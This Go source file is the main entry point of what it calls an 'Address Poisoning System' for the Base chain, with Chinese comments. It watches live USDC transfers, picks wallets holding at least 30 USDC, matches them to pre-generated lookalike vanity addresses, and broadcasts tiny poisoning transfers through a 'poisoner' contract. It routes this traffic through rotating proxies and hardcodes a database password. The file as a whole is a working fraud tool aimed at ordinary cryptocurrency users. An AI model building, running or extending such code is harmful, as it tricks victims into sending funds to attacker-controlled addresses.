package main

import (
	"context"
	"crypto/ecdsa"
	"encoding/hex"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"exploit/core"
	"exploit/database"
	"exploit/executor"
	"exploit/proxy"
	"exploit/security"
	"exploit/web"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/rpc"
	"github.com/jackc/pgx/v5/pgxpool"
	"go.uber.org/zap"
)

// 架构说明:
// 1. 完全弃用Redis，使用纯内存缓存
// 2. 数据库按日期分表 (vanity_addresses_YYYYMMDD)
// 3. 内存队列替代Redis Stream
// 4. LRU缓存替代Redis缓存

func main() {
	// 初始化日志
	logLevel := getEnv("LOG_LEVEL", "info")
	var logger *zap.Logger
	if logLevel == "debug" {
		logger, _ = zap.NewDevelopment()
	} else {
		logger, _ = zap.NewProduction()
	}
	defer logger.Sync()

	logger.Info("Starting Address Poisoning System (Base Chain)",
		zap.String("chain_id", getEnv("CHAIN_ID", "8453")),
		zap.String("usdc_contract", getEnv("USDC_CONTRACT", "")),
		zap.String("poisoner_contract", getEnv("POISONER_CONTRACT", "")),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// 连接PostgreSQL (增加连接池配置，支持大数据量加载)
	pgConnStr := fmt.Sprintf("postgres://%s:%s@%s:%s/%s?pool_max_conns=20&pool_min_conns=5&pool_max_conn_lifetime=0&pool_max_conn_idle_time=0",
		getEnv("POSTGRES_USER", "poison_user"),
		getEnv("POSTGRES_PASSWORD", "D07dZedJebQH1VXDPu8db8wM2aN523jy9v"),
		getEnv("POSTGRES_HOST", "localhost"),
		getEnv("POSTGRES_PORT", "5432"),
		getEnv("POSTGRES_DB", "poison_db"),
	)

	pgConfig, err := pgxpool.ParseConfig(pgConnStr)
	if err != nil {
		logger.Fatal("Failed to parse PostgreSQL config", zap.Error(err))
	}
	// 禁用查询超时，支持大表加载
	pgConfig.ConnConfig.ConnectTimeout = 0

	pgPool, err := pgxpool.NewWithConfig(ctx, pgConfig)
	if err != nil {
		logger.Fatal("Failed to connect to PostgreSQL", zap.Error(err))
	}
	defer pgPool.Close()

	// 初始化数据库分表管理器 (按日期分表)
	retentionDays := int(getEnvInt64("DATA_RETENTION_DAYS", 30))
	partitioner := database.NewPartitioner(pgPool, logger, retentionDays)
	go partitioner.Start(ctx) // 后台运行分表管理

	// 初始化黑名单 (纯内存)
	blacklist := core.NewBlacklist(logger)
	if err := blacklist.Initialize(); err != nil {
		logger.Warn("Failed to initialize blacklist", zap.Error(err))
	}

	// ==================== 初始化代理管理器 ====================
	proxyConfig := proxy.ProxyConfig{
		StickyProxy:   getEnv("PROXY_STICKY", ""),
		RotatingProxy: getEnv("PROXY_ROTATING", ""),
		StickyTTL:     2 * time.Minute, // 粘性代理2分钟有效期
	}

	var proxyManager *proxy.ProxyManager
	var httpClient *http.Client

	if proxyConfig.StickyProxy != "" || proxyConfig.RotatingProxy != "" {
		pm, err := proxy.NewProxyManager(proxyConfig, logger)
		if err != nil {
			logger.Fatal("Failed to create proxy manager", zap.Error(err))
		}
		proxyManager = pm
		httpClient = proxyManager.GetHTTPClient()
		logger.Info("✅ 代理管理器初始化成功",
			zap.Bool("sticky", proxyConfig.StickyProxy != ""),
			zap.Bool("rotating", proxyConfig.RotatingProxy != ""))
	} else {
		logger.Info("⚠️ 未配置代理，直接连接RPC节点")
	}

	// 初始化合约检测器 (多RPC节点+代理)
	rpcUrls := strings.Split(getEnv("RPC_URLS", "https://mainnet.base.org"), ",")
	for i := range rpcUrls {
		rpcUrls[i] = strings.TrimSpace(rpcUrls[i])
	}

	// 创建多个ethClient (支持代理，用于轮询)
	var ethClients []*ethclient.Client
	for _, rpcURL := range rpcUrls {
		if rpcURL == "" {
			continue
		}
		var client *ethclient.Client
		if httpClient != nil {
			rpcClient, err := rpc.DialHTTPWithClient(rpcURL, httpClient)
			if err != nil {
				logger.Warn("Failed to create eth client with proxy", zap.String("url", rpcURL), zap.Error(err))
				continue
			}
			client = ethclient.NewClient(rpcClient)
		} else {
			var err error
			client, err = ethclient.Dial(rpcURL)
			if err != nil {
				logger.Warn("Failed to create eth client", zap.String("url", rpcURL), zap.Error(err))
				continue
			}
		}
		ethClients = append(ethClients, client)
		logger.Info("✅ RPC客户端连接成功", zap.String("url", rpcURL), zap.Bool("proxy", httpClient != nil))
	}
	if len(ethClients) == 0 {
		logger.Fatal("No RPC clients available")
	}
	// 保持一个主客户端用于其他模块
	ethClient := ethClients[0]

	// 使用多RPC节点创建合约检测器 (自动轮换/重试+代理)
	contractDetector, err := core.NewContractDetectorWithProxy(rpcUrls, httpClient, logger)
	if err != nil {
		logger.Fatal("Failed to create contract detector", zap.Error(err))
	}
	logger.Info("✅ 合约检测器初始化", zap.Int("RPC节点数", len(rpcUrls)), zap.Bool("proxy", httpClient != nil))

	// 过滤器配置 (Base链: 只监控USDC)
	filterConfig := core.FilterConfig{
		MinTargetUSDCBalance: getEnvFloat("MIN_TARGET_USDC_BALANCE", 30), // USDC余额<30跳过 (Base USDC 6位小数)
		MinTransferAmountUSD: getEnvFloat("MIN_TRANSFER_AMOUNT_USD", 1),  // 转账金额<1跳过
	}

	// 初始化过滤器 (Base链: 只支持USDC, 6位小数!)
	usdcContract := getEnv("USDC_CONTRACT", "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913")
	filter, err := core.NewFilterWithUSDC(blacklist, contractDetector, ethClient, usdcContract, logger, filterConfig)
	if err != nil {
		logger.Fatal("Failed to create filter", zap.Error(err))
	}
	logger.Info("✅ 过滤器初始化 (Base链 USDC)",
		zap.Float64("USDC最小余额", filterConfig.MinTargetUSDCBalance))

	// 获取主密钥 (用于解密私钥)
	masterKey := []byte(getEnv("GENERATOR_MASTER_KEY", ""))
	if len(masterKey) == 0 {
		logger.Warn("⚠️ GENERATOR_MASTER_KEY 未设置")
	}

	// 初始化地址匹配器
	matcher := core.NewMatcher(pgPool, logger)

	// 检查索引模式
	useMemoryIndex := getEnv("USE_MEMORY_INDEX", "false") == "true"
	useSharding := getEnv("USE_SHARDING", "false") == "true"

	if useMemoryIndex {
		// 全内存索引模式 (15亿级数据，128GB内存服务器)
		matcher.EnableMemoryIndex(useSharding)
		logger.Info("🚀 全内存索引模式已启用",
			zap.Bool("分表模式", useSharding))
	}

	// 构建索引
	logger.Info("🔍 构建地址索引中...")
	if err := matcher.BuildIndex(ctx); err != nil {
		logger.Warn("构建索引失败，将使用慢速匹配", zap.Error(err))
	}

	// 初始化成本控制器
	costConfig := security.CostControlConfig{
		DailyBudgetUSD:    getEnvFloat("DAILY_BUDGET_USD", 300),
		HourlyLimitUSD:    getEnvFloat("HOURLY_LIMIT_USD", 30),
		MaxGasPriceGwei:   getEnvFloat("MAX_GAS_PRICE_GWEI", 3),
		AlertThresholdPct: getEnvFloat("ALERT_THRESHOLD_PERCENT", 80),
		PauseOnExceed:     getEnv("PAUSE_ON_EXCEED", "true") == "true",
	}
	_ = security.NewCostController(costConfig, nil, logger)

	// 解析金额 (用于合约充值)
	// Base链: 只使用USDC (6位小数), ETH (18位小数)
	// 智能投毒金额最大: 0.000099 USDC (99最小单位)
	// ETH充值: USDC transfer约46000 gas, 0.005 Gwei = 0.00000023 ETH
	// 增加缓冲: 0.0000005 ETH 确保足够
	ethAmount := parseAmount(getEnv("ETH_AMOUNT", "0.00000025"), 18) // ETH 18位小数
	usdcAmount := parseAmount(getEnv("USDC_AMOUNT", "0.0001"), 6)    // USDC 6位小数!

	// 初始化广播器配置 (Base链)
	// 智能投毒金额: 取原始金额前2位，0.0000XX USDC
	// Gas 价格: 启动时从 RPC 获取，每 25 分钟更新一次
	broadcasterConfig := executor.BroadcasterConfig{
		ChainID:          getEnvInt64("CHAIN_ID", 8453), // Base主网
		RPCUrls:          rpcUrls,
		USDCContract:     usdcContract, // Base USDC (6位小数)
		PoisonerContract: getEnv("POISONER_CONTRACT", ""),
		TransferGasLimit: uint64(getEnvInt64("TRANSFER_GAS_LIMIT", 60000)), // Base USDC transfer 需要约46000 gas
		GasPriceGwei:     getEnvFloat("GAS_PRICE_GWEI", 0.001),             // Base L2极低gas (备用)
		HTTPClient:       httpClient,
	}
	broadcaster, err := executor.NewBroadcasterFromEnv(broadcasterConfig, logger, masterKey)
	if err != nil {
		logger.Fatal("Failed to create broadcaster", zap.Error(err))
	}
	defer broadcaster.Close()

	// 初始化批量执行器配置 (Base链)
	execConfig := executor.ExecutorConfig{
		BatchSizeMin:        int(getEnvInt64("BATCH_SIZE_MIN", 10)),
		BatchSizeMax:        int(getEnvInt64("BATCH_SIZE_MAX", 50)),
		BatchTimeout:        time.Duration(getEnvInt64("BATCH_TIMEOUT_SECONDS", 300)) * time.Second,
		MaxConcurrent:       int(getEnvInt64("MAX_CONCURRENT_BROADCASTS", 50)),
		GasPriceMultiplier:  getEnvFloat("GAS_PRICE_MULTIPLIER", 1.0),
		ETHAmount:           ethAmount,                                       // Base链使用ETH作为gas
		USDTAmount:          big.NewInt(0),                                   // Base链不使用USDT
		USDCAmount:          usdcAmount,                                      // Base链使用USDC
		WETHAmount:          big.NewInt(0),                                   // Base链不使用WETH
		GasPriceGwei:        getEnvFloat("GAS_PRICE_GWEI", 0.001),            // Base L2极低gas
		ContractConfirmSecs: int(getEnvInt64("CONTRACT_CONFIRM_SECONDS", 2)), // Base出块快
	}

	// 合约地址
	poisonerContractAddr := common.HexToAddress(getEnv("POISONER_CONTRACT", ""))

	// 解析主钱包私钥 (用于调用合约)
	privateKeyHex := getEnv("PRIVATE_KEY", "")
	var ownerPrivateKey = (*ecdsa.PrivateKey)(nil)
	if privateKeyHex != "" {
		// 去掉可能的 0x 前缀
		privateKeyHex = strings.TrimPrefix(privateKeyHex, "0x")
		pkBytes, err := hex.DecodeString(privateKeyHex)
		if err != nil {
			logger.Fatal("Invalid private key format", zap.Error(err))
		}
		pk, err := crypto.ToECDSA(pkBytes)
		if err != nil {
			logger.Fatal("Failed to parse private key", zap.Error(err))
		}
		ownerPrivateKey = pk
		ownerAddr := crypto.PubkeyToAddress(pk.PublicKey)
		logger.Info("Owner wallet configured", zap.String("address", ownerAddr.Hex()))
	} else {
		logger.Warn("PRIVATE_KEY not set, contract calls will fail")
	}

	// Chain ID (Base主网: 8453)
	chainID := big.NewInt(getEnvInt64("CHAIN_ID", 8453))

	// 启动时更新合约默认金额 (Base链: ETH + USDC)
	if ownerPrivateKey != nil {
		// 复用旧函数，传入ETH和USDC金额
		if err := updateContractAmounts(ethClient, poisonerContractAddr, ownerPrivateKey, chainID, ethAmount, usdcAmount, usdcAmount, big.NewInt(0), logger); err != nil {
			logger.Warn("更新合约默认金额失败 (可忽略)", zap.Error(err))
		}
	}

	// 创建统计实例
	stats := core.NewStats(logger)
	stats.StartReporter(30 * time.Second) // 每30秒输出统计
	defer stats.Stop()

	// 创建内存队列 (替代Redis队列)
	queueSize := int(getEnvInt64("QUEUE_BUFFER_SIZE", 1000))
	matchQueue := core.NewMatchQueue(queueSize, logger, stats)

	// 创建数据库清理器 (地址可重复使用，默认不删除)
	cleanerConfig := core.CleanerConfig{
		Interval:  time.Duration(getEnvInt64("CLEANER_INTERVAL_HOURS", 1)) * time.Hour,
		MaxDays:   int(getEnvInt64("ADDRESS_MAX_DAYS", 0)), // 0=不删除地址
		BatchSize: 10000,
	}
	cleaner := core.NewCleaner(pgPool, logger, cleanerConfig, stats)
	go cleaner.Start(ctx) // 后台运行清理器

	// 创建去重器 (2天冷却期)
	dedupConfig := core.DedupConfig{
		CooldownHours: int(getEnvInt64("DEDUP_COOLDOWN_HOURS", 48)), // 默认48小时=2天
	}
	dedup := core.NewDeduplicator(pgPool, logger, dedupConfig)
	logger.Info("✅ 去重器初始化", zap.Int("冷却小时", dedupConfig.CooldownHours))

	// 创建执行器 (包含去重器，用于记录投毒结果)
	// 使用多RPC客户端轮询，提高稳定性
	batchExecutor := executor.NewBatchExecutor(
		ethClients, matchQueue, broadcaster, dedup, logger, stats, execConfig, poisonerContractAddr, ownerPrivateKey, chainID,
	)
	logger.Info("✅ 执行器初始化", zap.Int("RPC节点数", len(ethClients)), zap.Bool("proxy", httpClient != nil))

	// 解析多个WebSocket节点 (Base链)
	wsUrls := strings.Split(getEnv("WS_URLS", "wss://base.publicnode.com"), ",")
	for i, url := range wsUrls {
		wsUrls[i] = strings.TrimSpace(url)
	}
	logger.Info("📡 配置WebSocket节点 (Base链)", zap.Int("count", len(wsUrls)), zap.Strings("urls", wsUrls), zap.Bool("proxy", proxyManager != nil))

	// 初始化链上监控配置 (Base链: 只监控USDC)
	monitorConfig := core.MonitorConfig{
		USDCContract: usdcContract, // Base USDC (6位小数)
		WSUrls:       wsUrls,       // 多节点支持
	}
	// 如果有代理，设置代理URL
	if proxyManager != nil {
		monitorConfig.ProxyURL = proxyManager.GetProxyURL()
	}
	monitor := core.NewMonitorWithStats(nil, matchQueue, filter, matcher, dedup, logger, stats, monitorConfig)
	logger.Info("✅ Base链USDC监控配置", zap.String("USDC", usdcContract))

	// 创建Web服务器 (带安全认证)
	webConfig := web.ServerConfig{
		SecretPath: getEnv("WEB_SECRET_PATH", "admin"),
		Password:   getEnv("WEB_PASSWORD", "changeme"),
	}
	webServer := web.NewServer(stats, logger, webConfig)

	// 将WebServer的AddLog注入到Stats
	stats.SetWebLogFunc(webServer.AddLog)

	// 启动Web服务
	webPort := int(getEnvInt64("WEB_PORT", 8083))
	go func() {
		if err := webServer.Start(webPort); err != nil {
			logger.Error("Web server error", zap.Error(err))
		}
	}()

	// 启动监控服务
	go func() {
		if err := monitor.Start(ctx); err != nil {
			logger.Error("Monitor error", zap.Error(err))
		}
	}()

	// 启动执行器
	go func() {
		if err := batchExecutor.Start(ctx); err != nil {
			logger.Error("Executor error", zap.Error(err))
		}
	}()

	// 地址导出器已关闭 - 使用 scripts/export_used_addresses.py 手动导出
	// exporterConfig := core.ExporterConfig{
	// 	Interval:   time.Duration(getEnvInt64("EXPORT_INTERVAL_HOURS", 24)) * time.Hour,
	// 	ExportPath: getEnv("EXPORT_PATH", "/root/bsc-test/exploit"),
	// }
	// exporter := core.NewExporter(pgPool, logger, exporterConfig, stats, masterKey)
	// go exporter.Start(ctx)
	// logger.Info("📤 地址导出器初始化",
	// 	zap.Duration("间隔", exporterConfig.Interval),
	// 	zap.String("导出目录", exporterConfig.ExportPath))

	logger.Info("🚀 Base链系统启动完成",
		zap.Int("批次最小", execConfig.BatchSizeMin),
		zap.Int("批次最大", execConfig.BatchSizeMax),
		zap.String("USDC金额", getEnv("USDC_AMOUNT", "0.0001")),
		zap.String("ETH金额", getEnv("ETH_AMOUNT", "0.0000005")),
		zap.String("统计间隔", "30s"),
		zap.Int("Web端口", webPort),
	)

	// 等待退出信号
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh

	logger.Info("Shutting down...")
	cancel()
}

// 辅助函数
func getEnv(key, defaultVal string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return defaultVal
}

func getEnvInt64(key string, defaultVal int64) int64 {
	if val := os.Getenv(key); val != "" {
		if i, err := strconv.ParseInt(val, 10, 64); err == nil {
			return i
		}
	}
	return defaultVal
}

func getEnvFloat(key string, defaultVal float64) float64 {
	if val := os.Getenv(key); val != "" {
		if f, err := strconv.ParseFloat(val, 64); err == nil {
			return f
		}
	}
	return defaultVal
}

// parseAmount 解析金额字符串为big.Int (带小数位)
func parseAmount(amountStr string, decimals int) *big.Int {
	// 移除空格
	amountStr = strings.TrimSpace(amountStr)

	// 分离整数和小数部分
	parts := strings.Split(amountStr, ".")
	intPart := parts[0]
	fracPart := ""
	if len(parts) > 1 {
		fracPart = parts[1]
	}

	// 补齐或截断小数位
	if len(fracPart) < decimals {
		fracPart += strings.Repeat("0", decimals-len(fracPart))
	} else {
		fracPart = fracPart[:decimals]
	}

	// 合并为整数字符串
	fullStr := intPart + fracPart
	amount := new(big.Int)
	amount.SetString(fullStr, 10)
	return amount
}

// updateContractAmounts 更新合约默认金额 (4种代币)
func updateContractAmounts(
	client *ethclient.Client,
	contractAddr common.Address,
	privateKey *ecdsa.PrivateKey,
	chainID *big.Int,
	ethAmount, usdtAmount, usdcAmount, wethAmount *big.Int,
	logger *zap.Logger,
) error {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// ABI 编码 setDefaultAmounts(uint256 _ethAmount, uint256 _usdtAmount, uint256 _usdcAmount, uint256 _wethAmount)
	// 函数签名: setDefaultAmounts(uint256,uint256,uint256,uint256)
	// selector: keccak256("setDefaultAmounts(uint256,uint256,uint256,uint256)")[:4]
	methodID := crypto.Keccak256([]byte("setDefaultAmounts(uint256,uint256,uint256,uint256)"))[:4]
	paddedETH := common.LeftPadBytes(ethAmount.Bytes(), 32)
	paddedUSDT := common.LeftPadBytes(usdtAmount.Bytes(), 32)
	paddedUSDC := common.LeftPadBytes(usdcAmount.Bytes(), 32)
	paddedWETH := common.LeftPadBytes(wethAmount.Bytes(), 32)

	var data []byte
	data = append(data, methodID...)
	data = append(data, paddedETH...)
	data = append(data, paddedUSDT...)
	data = append(data, paddedUSDC...)
	data = append(data, paddedWETH...)

	// 获取 nonce
	fromAddr := crypto.PubkeyToAddress(privateKey.PublicKey)
	nonce, err := client.PendingNonceAt(ctx, fromAddr)
	if err != nil {
		return err
	}

	// 使用 0.01 Gwei (Base L2 最低可接受价格)
	gasPrice := big.NewInt(1e7) // 0.01 Gwei

	// 创建交易
	tx := types.NewTransaction(nonce, contractAddr, big.NewInt(0), 150000, gasPrice, data)

	// 签名
	signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey)
	if err != nil {
		return err
	}

	// 发送
	logger.Info("📝 更新合约充值金额 (Base链)",
		zap.String("tx", signedTx.Hash().Hex()[:18]+"..."),
		zap.String("ETH", fmt.Sprintf("%.12f", float64(ethAmount.Int64())/1e18)),
		zap.String("USDC", fmt.Sprintf("%.6f", float64(usdcAmount.Int64())/1e6)))

	err = client.SendTransaction(ctx, signedTx)
	// 忽略某些 RPC 节点返回的格式错误 (交易实际已发送)
	if err != nil && strings.Contains(err.Error(), "wrong json-rpc response") {
		logger.Debug("忽略 RPC 响应格式错误 (交易已发送)", zap.String("tx", signedTx.Hash().Hex()))
		return nil
	}
	return err
}
